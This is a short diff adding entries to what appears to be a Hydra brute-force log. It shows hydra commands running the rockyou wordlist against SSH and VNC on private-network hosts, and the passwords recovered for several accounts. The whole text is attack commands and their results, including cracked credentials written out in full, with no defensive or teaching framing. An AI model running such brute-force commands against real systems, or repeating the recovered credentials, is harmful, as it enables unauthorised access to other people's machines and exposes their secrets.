@@ -10,3 +10,6 @@
 [22][ssh] host: 192.168.1.91   login: kali   password: kali
 # Hydra v9.5 run at 2023-07-13 19:25:57 on 172.20.10.3 ssh (hydra -l zero -P rockyou.txt -t 64 -vV -o output.log -I ssh://172.20.10.3)
 [22][ssh] host: 172.20.10.3   login: zero   password: 21RussellLucy!@#!@#!@#
+# Hydra v9.5 run at 2023-07-14 14:04:25 on 192.168.1.13 vnc (hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://192.168.1.13)
+[5900][vnc] host: 192.168.1.13   password: Cmonster2006!@#!@#!@#
+# Hydra v9.5 run at 2023-07-14 16:14:52 on 192.168.1.47 ssh (hydra -l mac -P rockyou.txt -t 64 -vV -o output.log -I ssh://192.168.1.47)
